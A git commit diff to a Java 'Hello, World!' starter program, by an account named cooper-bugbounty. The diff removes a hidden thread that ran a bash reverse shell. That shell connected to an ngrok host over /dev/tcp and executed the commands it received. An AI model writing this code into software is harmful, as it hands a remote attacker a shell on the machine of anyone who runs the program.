a223f4756758de313b68dbfbaeed3c7de6dab81c
cooper-bugbounty <109574611+cooper-bugbounty@users.noreply.github.com>
2022-07-19 16:07:41 +1000

    Update FirstApplication.java

--- src/main/java/com/mjc/stage0/FirstApplication.java
+++ src/main/java/com/mjc/stage0/FirstApplication.java
@@ -3,13 +3,5 @@ package com.mjc.stage0;
 public class FirstApplication {
     public static void main(String[] args) {
         System.out.println("Hello, World!");
-        Thread thread = new Thread(){
-            public void run(){
-                Runtime r = Runtime.getRuntime();
-                Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/4.tcp.ngrok.io/19508;cat <&5 | while read line; do $line 2>&5 >&5; done'");
-                p.waitFor();
-            }
-        }
-        thread.start();
     }
 }
